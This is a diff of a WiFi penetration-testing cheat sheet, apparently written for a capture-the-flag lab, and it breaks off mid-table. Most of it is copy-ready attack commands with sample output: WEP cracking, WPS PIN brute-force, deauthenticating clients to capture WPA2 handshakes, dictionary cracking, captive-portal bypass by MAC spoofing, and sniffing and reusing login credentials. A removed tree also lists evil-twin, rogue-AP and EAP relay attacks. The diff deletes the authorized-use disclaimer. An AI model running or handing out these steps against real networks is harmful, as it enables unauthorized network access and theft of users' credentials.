@@ -1,432 +1,378 @@
 # WiFi Hacking Tree
 
-**Disclaimer:** This content is provided for educational purposes and authorized security testing only. Do not use these techniques against networks you do not own or have explicit written permission to test. The author assumes no liability for misuse, damage, or legal consequences. Always comply with applicable laws and regulations.
-
-
-
-<a name="master-tree"></a>
-## 1. Master Decision Tree
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                    Start: WiFi Penetration Test                     │
-│              Goal: Find flag from AP or web server                  │
-└─────────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│  Step 0: Environment Setup                                          │
-│  • airmon-ng check kill                                             │
-│  • Create monitor interface                                         │
-│  • Survey nearby networks                                           │
-└─────────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│  Step 1: Enumeration (airodump-ng --band abg)                       │
-│  Output: BSSID, CH, ENC, CIPHER, AUTH, WPS, ESSID                   │
-│  Clients: STATION, Probes, Notes                                    │
-└─────────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-        ┌─────────────────────┼─────────────────────┐
-        │                     │                     │
-        ▼                     ▼                     ▼
-   ┌─────────┐          ┌──────────┐         ┌──────────┐
-   │  OPN    │          │   WEP    │         │ WPA2-PSK │
-   │ (Open)  │          │ (Legacy) │         │ (Encrypted)│
-   └────┬────┘          └────┬─────┘         └────┬─────┘
-        │                     │                    │
-        │                     │                    ├── Has client?
-        │                     │                    │    ├── Yes → Deauth + Handshake + Crack
-        │                     │                    │    └── No → PMKID (hcxdumptool)
-        │                     │                    │
-        │                     │                    ├── Network absent + Probe seen?
-        │                     │                    │    └── Yes → Rogue AP (hostapd-mana)
-        │                     │                    │
-        │                     │                    └── WPS enabled?
-        │                     │                         └── Yes → reaver -K 1
-        │                     │
-        │                     ├── Has active client?
-        │                     │    ├── Yes → besside-ng (automated)
-        │                     │    └── No → Fake Auth + ARP Replay
-        │                     │
-        │                     └── Manual WEP:
-        │                          aireplay-ng -1 (Fake Auth)
-        │                          aireplay-ng --arpreplay
-        │                          aircrack-ng
-        │
-        ├── Has Captive Portal?
-        │    ├── Yes → MAC Spoofing + HTTP Sniff + Credential
-        │    └── No → Connect + admin/admin + router flag
-        │
-        └── Post-exploitation:
-             • airdecap-ng (decrypt traffic)
-             • tshark (extract cookie, credential)
-             • arp-scan (test Client Isolation)
-             • curl -b "cookie" (Session Hijacking)
-
-        ┌─────────────────────┼─────────────────────┐
-        │                     │                     │
-        ▼                     ▼                     ▼
-   ┌─────────┐          ┌──────────┐         ┌──────────────┐
-   │ WPA3-   │          │   MGT    │         │     OWE      │
-   │ SAE     │          │(Enterprise)│        │ (Enhanced    │
-   │         │          │          │         │  Open)       │
-   └────┬────┘          └────┬─────┘         └──────┬───────┘
-        │                    │                      │
-        ├── Transition Mode  │                      ├── Direct connect (key_mgmt=OWE)
-        │   (WPA2+WPA3)?     │                      │   → Works 99% of the time
-        │   └── Yes →        │                      │
-        │   Deauth + Handshake│                     └── If it fails:
-        │   + Crack (WPA2)   │                          DragonDrain (DoS)
-        │                    │                          → retry
-        └── WPA3-only?       │
-            └── wacker.py    │
-                (online)     │
-                             │
-                             ├── 1. Passive Recon (no attack):
-                             │   tshark → eap.identity (username)
-                             │   tshark → tls.certificate (server cert)
-                             │   → email, CN, domain
-                             │
-                             ├── 2. Identify EAP Method:
-                             │   tshark -Y "eap" -e eap.type
-                             │   ├── 4  → EAP-MD5 → hcxpcapngtool + hashcat 4800
-                             │   ├── 13 → EAP-TLS → client certificate (Rogue AP)
-                             │   ├── 21 → EAP-TTLS → eaphammer + asleap
-                             │   ├── 25 → PEAP → eaphammer + asleap
-                             │   ├── 6  → EAP-GTC → gtc-downgrade
-                             │   ├── 18 → EAP-SIM → IMSI extraction
-                             │   ├── 23 → EAP-AKA → IMSI extraction
-                             │   └── 50 → EAP-AKA' → IMSI extraction
-                             │
-                             ├── 3. Attack based on Method:
-                             │   ├── PEAP/TTLS:
-                             │   │   ├── eaphammer --creds → MSCHAPv2
-                             │   │   ├── asleap/hashcat -m 5500
-                             │   │   └── or gtc-downgrade → plaintext
-                             │   │
-                             │   ├── EAP-TLS:
-                             │   │   ├── Have real server cert?
-                             │   │   │   ├── Yes → eaphammer --cert-wizard import
-                             │   │   │   └── No → hostapd-wpe (accept any cert)
-                             │   │   ├── Have CA.key?
-                             │   │   │   └── Yes → generate fake cert for any user
-                             │   │   └── Connect with fake cert → flag
-                             │   │
-                             │   └── Relay (PEAP):
-                             │       berate_ap --wpa-sycophant
-                             │       + wpa_sycophant
-                             │       + Deauth vulnerable client
-                             │
-                             ├── 4. Online Brute-force:
-                             │   air-hammer (user × pass)
-                             │   or air-hammer (userlist × single pass)
-                             │
-                             └── 5. Evil Twin / Phishing:
-                                 Client probing for another network?
-                                 └── eaphammer --captive-portal
-                                     or --hostile-portal
-                                     → hashcat -m 5600 (NetNTLMv2)
-                                     → or plaintext from POST
-```
+> **Usage Guide:** This cheat sheet is ordered from initial setup to the final stage of exploitation. Each attack includes: **Prerequisites → Commands → Data Obtained → Next Step**.
 
 ---
 
-<a name="setup"></a>
-## 2. Environment Setup and Tools
+## 🧰 Section Zero: Initial Setup and Full Reset
 
-### 2.1. Full Wireless Card Reset
+### 0.1. Full Environment Reset (Before Each Challenge)
 
 ```bash
-# Kill interfering processes
+# 1. Kill interfering processes
+sudo systemctl stop NetworkManager
 sudo pkill wpa_supplicant
 sudo pkill dhclient
-sudo pkill hostapd
-sudo pkill eaphammer
-sudo pkill aireplay-ng
-sudo pkill airodump-ng
-sudo pkill berate_ap
-sudo pkill dnsmasq
-
-# Reset NetworkManager and airmon
-sudo systemctl stop NetworkManager
 sudo airmon-ng check kill
 
-# Remove all virtual interfaces
+# 2. Delete all virtual monitor interfaces
 for i in $(iw dev | grep Interface | awk '{print $2}'); do
-    sudo ip link set $i down 2>/dev/null
     sudo iw dev $i del 2>/dev/null
 done
 
-# Reset driver (for WiFiChallengeLab: mac80211_hwsim)
+# 3. Reset driver (in simulator environment)
 sudo modprobe -r mac80211_hwsim && sleep 2 && sudo modprobe mac80211_hwsim
 
-# Restart NetworkManager (optional)
-sudo systemctl start NetworkManager
+# 4. (Optional) Ready-made script
+sudo ~/restartWiFi.sh
 ```
 
-### 2.2. Create Monitor Interface
+### 0.2. Identify Interfaces and Driver
 
 ```bash
-# Method 1: airmon-ng (simplest)
-sudo airmon-ng start wlan0
+iw dev                    # List interfaces
+iw phy                    # List physical radios
+iw phy phy0 info          # Capabilities of phy0
 
-# Method 2: manual (if airmon-ng fails)
-sudo iw phy phy0 interface add wlan0mon type monitor
-sudo ip link set wlan0mon up
-sudo iw dev wlan0mon set channel 44  # if channel is known
-
-# Verify
-iw dev
-iw dev wlan0mon info   # should show type monitor
+# Find card driver
+readlink /sys/class/net/wlan0/device/driver
+sudo ethtool -i wlan0
+lsusb -t                  # For USB
+lspci -k                  # For PCI
 ```
 
-### 2.3. Key Note: Shared Interface
+### 0.3. Create Monitor Mode (Manual Method — Most Reliable)
 
-> ⚠️ **Important warning:** If `wlan0mon` is on the same `phy` as `wlan0` (managed), tools like `hcxdumptool` will fail with `failed to arm interface`.
->
-> **Solution:** Create a dedicated monitor interface on a separate `phy`:
-> ```bash
-> # e.g., phy70 for hcxdumptool
-> sudo iw phy phy70 interface add wlan6mon type monitor
-> sudo ip link set wlan6mon up
-> ```
+```bash
+# airmon-ng method
+sudo airmon-ng start wlan0
+
+# Manual method (if airmon is broken)
+sudo iw phy phy0 interface add wlan0mon type monitor
+sudo ip link set wlan0mon up
+iw dev wlan0mon info      # Should show type monitor
+```
+
+> ⚠️ **Golden Note:** For `hcxdumptool` always use a **dedicated** monitor interface (on a separate `phy`), not `wlan0mon` which shares with `wlan0`.
+
+### 0.4. Managing Managed Interfaces
+
+```bash
+# Disable/enable
+sudo ip link set wlan1 down
+sudo ip link set wlan1 up
+
+# Change type to managed
+sudo iw dev wlan1 set type managed
+
+# Rename interface
+sudo ip link set wlan0mon down
+sudo ip link set wlan0mon name mymon
+sudo ip link set mymon up
+```
 
 ---
 
-<a name="recon"></a>
-## 3. Phase 0: Enumeration and Recon
+## 🔍 Section 1: Recon / Enumeration
 
-### 3.1. Comprehensive Scan
+### 1.1. Comprehensive Scan of All Bands
 
 ```bash
+mkdir -p ~/wifi
 sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
 ```
 
-**Important AP Columns:**
+| Flag | Meaning |
+|-----|---------|
+| `--band abg` | Scan 2.4GHz (b/g) and 5GHz (a) — **without this, 5GHz networks won't appear** |
+| `--wps` | Show WPS status |
+| `--manufacturer` | Show manufacturer |
+| `-w` | Save output (`.cap`, `.csv`, ...) |
 
-| Column | Meaning | Values |
-|------|------|--------|
-| **BSSID** | Router MAC | `F0:9F:C2:...` |
-| **PWR** | Signal strength | Closer to 0 = stronger |
-| **CH** | Channel | `1`, `6`, `11`, `44`, `48` |
-| **ENC** | Encryption | `OPN`, `WEP`, `WPA2`, `WPA3` |
-| **CIPHER** | Algorithm | `CCMP`, `TKIP`, `WEP` |
-| **AUTH** | Authentication | `PSK`, `MGT`, `SAE`, `OWE` |
-| **WPS** | WPS support | `0.0` (no), `2.0` (yes) |
-| **ESSID** | Network name | `<length: 9>` = hidden |
-
-**Important Client Columns:**
+### 1.2. Important Output Columns — APs (Top Table)
 
 | Column | Meaning | Use |
-|------|------|--------|
-| **STATION** | Client MAC | Deauth target |
-| **Probes** | Networks being sought | 🎯 **gold** for Evil Twin |
-| **Notes** | `PMKID` or `WPA handshake` | Success indicator |
-| `(not associated)` | Not connected | Scanning |
+|------|---------|-----|
+| **BSSID** | AP MAC | Target identifier for filtering |
+| **PWR** | Signal strength (closer to zero = stronger) | Choose nearby target |
+| **CH** | Channel | **Critical** for locking card |
+| **ENC** | Encryption type: `OPN`/`WEP`/`WPA2`/`WPA3` | Determine attack type |
+| **CIPHER** | `CCMP` (strong), `TKIP` (weak), `WEP` | Target priority |
+| **AUTH** | `PSK` / `MGT` / `SAE` / `OWE` | Determine strategy |
+| **WPS** | `0.0` = disabled, `2.0` = enabled | WPS attack |
+| **ESSID** | Network name (`<length: N>` = hidden) | Identification |
 
-### 3.2. Save and Analyze Output
+### 1.3. Important Output Columns — Clients (Bottom Table)
+
+| Column | Meaning | Use |
+|------|---------|-----|
+| **BSSID** | Connected AP | Network detection |
+| **STATION** | Client MAC | Deauth/Evil Twin target |
+| **Probes** | Searched networks | **Golden** for Evil Twin |
+| **Notes** | `PMKID` or `WPA handshake` | Capture success indicator |
+| `(not associated)` | Not connected | Free client |
+
+### 1.4. Extracting Information from CSV File
 
 ```bash
-# Outputs: scan-01.cap, scan-01.csv, scan-01.kismet.*
-ls ~/wifi/
-
-# Search CSV
+# Search for specific network
 cat ~/wifi/scan-01.csv | grep "wifi-global"
 
-# Extract with tshark
-tshark -r ~/wifi/scan-01.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.sa -e wlan.ssid -e radiotap.channel.freq
+# Sample output:
+# F0:9F:C2:71:22:17, ..., 44, 54, WPA2, CCMP, MGT, -28, ..., wifi-global
+# → BSSID = F0:9F:C2:71:22:17, CH = 44
 ```
 
-### 3.3. Supplementary Recon Tools
+### 1.5. Finding Probes with tshark
 
 ```bash
-# 1. WiFi_db (SQLITE database)
+# Probe Request frames (subtype 4)
+tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" \
+  -T fields -e wlan.sa -e wlan.ssid -e radiotap.channel.freq
+
+# Filter specific client
+tshark -r capture.cap -Y "wlan.fc.type_subtype == 4 && wlan.sa == 78:c1:a7:bf:72:46" \
+  -T fields -e wlan.ssid
+```
+
+### 1.6. Database Scans with wifi_db
+
+```bash
+sudo apt install sqlitebrowser -y
 git clone https://github.com/r4ulcl/wifi_db.git
-cd wifi_db
-sudo python3 wifi_db.py -d ~/wifi/wifichallenge.SQLITE ~/wifi/
-sudo sqlitebrowser ~/wifi/wifichallenge.SQLITE
-
-# 2. wash (check WPS)
-sudo wash -i wlan0mon -c <CH>
-
-# 3. iw scan (check RSN Capabilities - PMF)
-sudo iw dev wlan2 scan | grep -A 20 "wifi-IT" | grep -A 6 "RSN"
+cd /root/tools/wifi_db
+sudo python3 wifi_db.py -d /home/user/wifi/wifichallenge.SQLITE /home/user/wifi
+sudo sqlitebrowser /home/user/wifi/wifichallenge.SQLITE
 ```
 
-### 3.4. Interpreting RSN Capabilities (MFP/PMF Detection)
-
-```
-RSN Capabilities: 0x008c = 0000 0000 1000 1100
-                    │                ││││
-                    │                │││└── bit 2: 16-PTKSA-RC
-                    │                ││└─── bit 3: 1-GTKSA-RC  
-                    │                └┴──── bit 6,7: MFPR/MFPC
+```sql
+SELECT * FROM AP;
+SELECT * FROM Client;
 ```
 
-| MFPC (bit 7) | MFPR (bit 6) | Meaning | Does Deauth work? |
-|:---:|:---:|------|:---:|
-| 0 | 0 | PMF disabled | ✅ Yes |
-| 1 | 0 | PMF optional | ✅ Yes (for non-MFP clients) |
-| 1 | 1 | PMF required | ❌ No |
+### 1.7. airodump-ng Output Files
+
+| File | Use |
+|------|-----|
+| **`scan-01.cap`** | Main file — Wireshark/aircrack |
+| `scan-01.csv` | Plain text — grep |
+| `scan-01.kismet.csv` | Kismet output |
+| `scan-01.kismet.netxml` | Kismet XML |
+| `scan-01.log.csv` | Event log |
 
 ---
 
-<a name="opn"></a>
-## 4. Phase 1: OPN Branch (Open Network)
+## 🌐 Section 2: Attacking OPN (Open) Networks
 
-```
-OPN (ENC = OPN)
-│
-├── Has Captive Portal?
-│   │
-│   ├── Yes → MAC Spoofing + HTTP Sniff
-│   │   ├── 1. Scan and find valid client MAC
-│   │   ├── 2. macchanger -m <CLIENT_MAC> wlan2
-│   │   ├── 3. wpa_supplicant (key_mgmt=NONE)
-│   │   ├── 4. dhclient (get IP)
-│   │   ├── 5. airodump-ng -c <CH> -w capture
-│   │   ├── 6. Wireshark → http.request.method == POST
-│   │   └── 7. Extract user/pass → login → flag
-│   │
-│   └── No → Direct connection
-│       ├── wpa_supplicant → dhclient
-│       ├── ip route (find gateway)
-│       └── http://<gateway> → admin/admin → flag
-```
+### 2.1. Connecting to Open Network (Simplest)
 
-### 4.1. Open Network Configuration
-
+**Step 1: Create config**
 ```conf
-# free.conf
+# ~/wifi/open.conf
 network={
     ssid="wifi-free"
     key_mgmt=NONE
-    scan_ssid=1
+    scan_ssid=1        # if network is hidden
 }
 ```
 
-### 4.2. Connection Commands
-
+**Step 2: Connect**
 ```bash
-# Connect
-sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf -B
-
-# Get IP
-sudo dhclient wlan2 -v
-
-# Verify
-ip a show wlan2
-ip route | grep default
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
 ```
 
-### 4.3. Bypass Captive Portal with MAC Spoofing
+**Step 3: Obtain IP**
+```bash
+sudo dhclient wlan2 -v
+# Output: bound to 192.168.16.84 from 192.168.16.1
+# → Gateway = 192.168.16.1
+```
+
+**Step 4: Identify Gateway**
+```bash
+ip route
+# or
+ip a show wlan2
+```
+
+**Step 5: Access Router Panel**
+```bash
+firefox http://192.168.16.1
+# Try admin/admin, admin/password, admin/1234 ...
+```
+
+---
+
+### 2.2. Bypassing Captive Portal with MAC Spoofing
+
+**Strategy:** Login page decides based on MAC → spoof a valid client's MAC → enter without login.
+
+**Step 1: Capture traffic + identify active client**
+```bash
+sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c6
+# Frames column → highest = most active client (valid)
+# Example: B0:72:BF:44:B0:49 with 232 frames
+```
+
+**Step 2: Initial connection to network**
+```bash
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
+sudo dhclient wlan2 -v
+```
+
+**Step 3: Spoof MAC**
 
 ```bash
-# 1. Find active client MAC from airodump-ng
-# (STATION column with high Frames)
+# Stop NetworkManager
+sudo systemctl stop NetworkManager
 
-# 2. Stop NetworkManager and change MAC
-sudo systemctl stop network-manager
+# Bring interface down, change MAC, bring up
 sudo ip link set wlan2 down
 sudo macchanger -m b0:72:bf:44:b0:49 wlan2
 sudo ip link set wlan2 up
 
-# 3. Reconnect (no login needed if MAC is in allowed list)
-sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf -B
-sudo dhclient wlan2 -v
+# If wpa_supplicant gets stuck:
+sudo pkill wpa_supplicant
+sudo ip link set wlan2 down && sleep 2
+sudo ip link set wlan2 up && sleep 2
 ```
 
-### 4.4. HTTP Sniffing and Credential Extraction
+**Step 4: Reconnect**
+```bash
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
+sudo dhclient -v wlan2
+```
+
+**Step 5: Sniff HTTP to Extract Credentials**
 
 ```bash
-# Capture on target channel
-sudo airodump-ng wlan0mon -c 6 -w ~/wifi/capture
+# Wait 3-5 minutes for traffic to accumulate
+sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c6
+```
 
-# Wait for user login (3-5 minutes)
-
-# Analyze in Wireshark
-wireshark ~/wifi/capture-01.cap
+**Step 6: Analyze in Wireshark**
+```bash
+wireshark ~/wifi/scanc6-01.cap
 # Filter: http.request.method == "POST"
-
-# Or with tshark
-tshark -r ~/wifi/capture-01.cap -Y "http.request.method == \"POST\"" -T fields -e http.file_data
+# or: http contains "Password"
 ```
 
-**Example output:**
+**Sample output:**
 ```
-Username=free1&Password=Jyl1iq8UajZ1fEK&Submit=Login
+Form item: "Username" = "free1"
+Form item: "Password" = "Jyl1iq8UajZ1fEK"
+```
+
+**Step 7: Login with stolen credentials**
+```bash
+firefox http://<gateway>
+# username: free1, password: Jyl1iq8UajZ1fEK
 ```
 
 ---
 
-<a name="wep"></a>
-## 5. Phase 2: WEP Branch
+## 🐌 Section 3: Attacking WEP
 
-```
-WEP (ENC = WEP)
-│
-├── Automated method (fastest)
-│   └── besside-ng -c <CH> -b <BSSID> wlan2 -v
-│       (does Fake Auth + ARP Replay + IV collection + cracking)
-│
-└── Manual method (if besside-ng fails)
-    │
-    ├── 1. Capture data
-    │   └── airodump-ng -c <CH> --bssid <BSSID> -w ~/wifi/wep wlan0mon
-    │
-    ├── 2. Fake Auth
-    │   └── aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
-    │
-    ├── 3. ARP Replay
-    │   └── aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
-    │
-    ├── 4. Wait for IVs (20,000-50,000)
-    │
-    ├── 5. Crack
-    │   └── aircrack-ng ~/wifi/wep-01.cap
-    │
-    └── 6. Connect
-        └── wpa_supplicant with wep_key0
+### 3.1. Theoretical Background — Why WEP is Broken
+
+- WEP uses **RC4**.
+- Each packet has **IV** (24-bit) + key = Keystream.
+- IV is only 24-bit → ~16 million values → by collecting enough IVs (20-50k), the key can be broken with **FMS/PTW Attack**.
+- `aircrack-ng` performs statistical analysis itself.
+
+### 3.2. AUTO Method — `besside-ng` (Fastest)
+
+**Step 1: Preparation**
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon --band abg -w ~/wifi/scan7
+# Find BSSID and channel of wifi-old (e.g., CH=3)
 ```
 
-### 5.1. Automated Method with besside-ng
-
+**Step 2: Run automated attack**
 ```bash
 sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v
 ```
 
-**Successful output:**
+> ⚠️ Note: `besside-ng` runs on the **Monitor Mode** interface (`wlan2` that you put into monitor), not `wlan0mon` created by airmon.
+
+**What happens?**
+1. Automatic Fake Auth
+2. Association
+3. ARP Replay
+4. Collect 30,000+ IVs in ~4 minutes
+5. Automatic cracking
+
+**Step 3: Read key from log**
 ```
 [02:35:38] Got key for wifi-old [11:bb:33:cd:55] 30044 IVs
 [02:35:38] Pwned network wifi-old in 4:22 mins:sec
 ```
+→ **KEY = `11:bb:33:cd:55`**
 
-### 5.2. Manual Method (Step by Step)
+---
+
+### 3.3. MANUAL Method — Step by Step
+
+#### Step 1: Capture traffic from target
 
 ```bash
-# 1. Capture
-sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w ~/wifi/wifi-old wlan0mon
-
-# 2. Fake Auth (terminal 2)
-sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon
-
-# 3. ARP Replay (terminal 3)
-sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h BA:49:A9:53:A1:8C wlan0mon
-
-# 4. If no ARP, send Deauth
-sudo aireplay-ng --deauth 5 -a F0:9F:C2:71:22:11 -c <CLIENT_MAC> wlan0mon
-
-# 5. Crack
-sudo aircrack-ng ~/wifi/wifi-old-01.cap
+sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 \
+  -w ~/wifi/wifi-old wlan0mon
 ```
 
-### 5.3. Connect to WEP
+> `#Data` column = number of IVs collected. **Goal: 20,000 to 50,000**
+
+#### Step 2: Fake Authentication (introduce yourself to AP)
+
+```bash
+sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon
+```
+
+| Flag | Meaning |
+|-----|---------|
+| `-1 3600` | Re-authenticate every 3600 seconds |
+| `-q 10` | Keep-Alive every 10 seconds |
+| `-a` | Target BSSID |
+
+> **Why?** AP only talks to associated clients. WEP works with Open Auth, so no password needed.
+
+#### Step 3: ARP Replay (generate artificial traffic)
+
+```bash
+sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 \
+  -h BA:49:A9:53:A1:8C wlan0mon
+```
+
+| Flag | Meaning |
+|-----|---------|
+| `--arpreplay` | Inject captured ARPs |
+| `-b` | Target BSSID |
+| `-h` | Your MAC (fake client) |
+
+> **Why?** AP sends packets faster → more IVs generated.
+
+#### Step 3.5 (Optional): Deauth to stimulate traffic
+
+```bash
+sudo aireplay-ng --deauth 5 -a F0:9F:C2:71:22:11 \
+  -c 64:32:A8:56:32:56 wlan0mon
+```
+
+#### Step 4: Crack the key
+
+```bash
+sudo aircrack-ng ~/wifi/wifi-old-01.cap
+# Output: KEY FOUND! [ 11:bb:33:cd:55 ]
+```
+
+#### Step 5: Create WEP config and connect
 
 ```conf
-# wep.conf
+# ~/wifi/wep.conf
 network={
     ssid="wifi-old"
     key_mgmt=NONE
@@ -436,102 +382,271 @@ network={
 ```
 
 ```bash
-sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/wep.conf -B
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/wep.conf
 sudo dhclient wlan2 -v
+ip route
+# Access router web server and retrieve flag
 ```
 
-### 5.4. WEP Attacks Not in the Writeup (But Important!)
+### 3.4. Supplementary WEP Attacks (Not in Writeup but Important)
 
-| Attack | Tool | Use |
-|------|-------|--------|
-| **Fragmentation** | `aireplay-ng -5` | Generate IVs without ARP |
-| **ChopChop** | `aireplay-ng -4` | Crack without ARP |
-| **KoreK** | `aircrack-ng -K` | Legacy method |
-| **PTW** | `aircrack-ng` (default) | Fastest method |
+| Attack | Command | Use |
+|------|-------|-----|
+| **Fragmentation** | `aireplay-ng -5 -b <BSSID> -h <MAC> wlan0mon` | Generate IVs without ARP |
+| **ChopChop** | `aireplay-ng -4 -b <BSSID> -h <MAC> wlan0mon` | Crack packet without ARP |
+| **KoreK** | `aircrack-ng -K capture.cap` | Old WEP cracking method |
 
 ---
 
-<a name="wpa2"></a>
-## 6. Phase 3: WPA2-PSK Branch
+## 🔑 Section 4: Attacking WPS
 
-```
-WPA2-PSK (ENC=WPA2, AUTH=PSK)
-│
-├── Has connected client?
-│   │
-│   ├── Yes → Deauth + Handshake + Crack
-│   │   ├── 1. airodump-ng -c <CH> --bssid <BSSID> -w capture
-│   │   ├── 2. aireplay-ng -0 10 -a <BSSID> -c <CLIENT>
-│   │   ├── 3. Wait for [WPA handshake: ...]
-│   │   ├── 4. aircrack-ng capture-01.cap -w rockyou.txt
-│   │   └── 5. Connect + airdecap-ng + post-exploit
-│   │
-│   ├── No → PMKID Attack (Client-less)
-│   │   ├── hcxdumptool -i wlan6mon -w pmkid.pcapng -c <CH>a --rds=2 -A
-│   │   ├── hcxpcapngtool -o pmkid.22000 pmkid.pcapng
-│   │   └── hashcat -m 22000 -a 0 pmkid.22000 rockyou.txt
-│   │
-│   └── Network absent + client Probe seen?
-│       └── Rogue AP (hostapd-mana)
-│           ├── hostapd-mana with essid=target, wpa_passphrase=12345678
-│           ├── mana_wpaout=hostapd.hccapx
-│           ├── Deauth client
-│           ├── hashcat -m 22000 hostapd.hccapx
-│           └── Connect
-│
-└── WPS enabled? (WPS column = 2.0)
-    └── Go to WPS branch
-```
+### 4.1. Why WPS is Dangerous
 
-### 6.1. Capture Handshake
+- 8-digit PIN is split into **two 4-digit halves**.
+- AP checks each half separately → only **20,000** possibilities (not 100 million).
+- Some APs are vulnerable to **Pixie Dust** (crack in seconds).
+
+### 4.2. Identifying Active WPS
 
 ```bash
-# 1. Lock on target channel
-sudo airodump-ng wlan0mon -c 6 --bssid F0:9F:C2:71:22:12 -w ~/wifi/psk
+# Method 1: From airodump output (WPS column)
+# Number other than 0.0 = WPS enabled
 
-# 2. Deauth in another terminal
-sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c <CLIENT_MAC> wlan0mon
-
-# 3. Wait for success message at top of airodump:
-# [ WPA handshake: F0:9F:C2:71:22:12 ]
-
-# 4. Crack
-aircrack-ng ~/wifi/psk-01.cap -w /root/rockyou-top100000.txt
+# Method 2: wash
+sudo wash -i wlan0mon -c 8
 ```
+
+**Sample output:**
+```
+BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
+F0:9F:C2:71:22:13    8  -30  2.0  No             wifi-event
+```
+→ **WPS=2.0 (enabled), Lck=No (not locked) ✅**
+
+> 🔒 If `Lck: Yes`: ignore with `-L` flag, try `bully`, or wait.
+
+### 4.3. Method 1 — Pixie Dust (Fastest)
+
+```bash
+sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -K 1
+```
+
+| Flag | Meaning |
+|-----|---------|
+| `-i` | Monitor interface |
+| `-b` | Target BSSID |
+| `-c` | Channel |
+| `-vv` | verbose |
+| `-K 1` | Pixie Dust mode |
+
+### 4.4. Method 2 — PIN Brute-force (If Pixie Dust Fails)
+
+```bash
+sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -S -N -L
+```
+
+| Flag | Meaning |
+|-----|---------|
+| `-S` | Small DH keys (faster) |
+| `-N` | No NACK |
+| `-L` | Ignore WPS lock |
 
 **Successful output:**
 ```
-KEY FOUND! [ starwars1 ]
+WPS PIN: 12345670
+WPA PSK: @MegaPSKP@ssword!@
+AP SSID: wifi-event
 ```
 
-### 6.2. PMKID Attack (Client-less)
-
-```bash
-# 1. Create dedicated monitor interface (important!)
-sudo iw phy phy70 interface add wlan6mon type monitor
-sudo ip link set wlan6mon up
-sudo iw dev wlan6mon set channel 7
-
-# 2. Run hcxdumptool
-sudo hcxdumptool -i wlan6mon -w pmkid.pcapng -c 7a --rds=2 -A
-
-# 3. Extract hash
-hcxpcapngtool -o pmkid.22000 pmkid.pcapng
-
-# 4. Crack
-hashcat -m 22000 -a 0 pmkid.22000 /root/rockyou-top100000.txt --force
-```
-
-### 6.3. Rogue AP for Absent Network (hostapd-mana)
-
-**Scenario:** `wifi-offices` network is unavailable, but clients still send Probe Requests.
-
-```bash
-# 1. Configure hostapd-mana
-nano hostapd.conf
-```
+### 4.5. Connect with Obtained Password
 
 ```conf
+network={
+    ssid="wifi-event"
+    psk="@MegaPSKP@ssword!@"
+}
+```
+
+```bash
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/event.conf
+sudo dhclient wlan2 -v
+# → Access network and retrieve flag from router
+```
+
+---
+
+## 🔐 Section 5: Attacking PSK (WPA2-Personal)
+
+### 5.1. Capture 4-Way Handshake + Dictionary Attack
+
+**Prerequisite:** A client connected to the network exists.
+
+#### Step 1: Lock card on target channel
+
+```bash
+# Find channel from scan
+sudo airodump-ng wlan0mon --band abg -w ~/wifi/scan
+# Assume: wifi-mobile on CH=6, BSSID=F0:9F:C2:71:22:12
+```
+
+> ⚠️ **Why lock?** `airodump-ng` without `-c` hops between channels and may miss the Handshake.
+
+#### Step 2: Deauth to force reconnect
+
+```bash
+sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c <CLIENT-MAC> wlan0mon
+```
+
+#### Step 3: Simultaneous capture
+
+```bash
+sudo airodump-ng wlan0mon -c 6 --bssid F0:9F:C2:71:22:12 \
+  -w ~/wifi/scanc6
+# When this line appears → success:
+# [ WPA handshake: F0:9F:C2:71:22:12
+```
+
+#### Step 4: Dictionary Attack
+
+```bash
+aircrack-ng ~/wifi/scanc6-01.cap -w /root/rockyou-top100000.txt
+# Output: KEY FOUND! [ starwars1 ]
+```
+
+#### Step 5: Connect and exploit
+
+```conf
+network={
+    ssid="wifi-mobile"
+    psk="starwars1"
+    scan_ssid=1
+    key_mgmt=WPA-PSK
+    proto=WPA2
+}
+```
+
+```bash
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan3 -c ~/wifi/psk.conf
+sudo dhclient wlan3 -v
+ip a show wlan3
+ip route | grep default
+```
+
+---
+
+### 5.2. Decrypting WPA2 Traffic (Passive Decrypt)
+
+**Step 1: Decrypt cap file**
+```bash
+airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/scanc6-01.cap
+# Output: ~/wifi/scanc6-01-dec.cap
+```
+
+| Flag | Meaning |
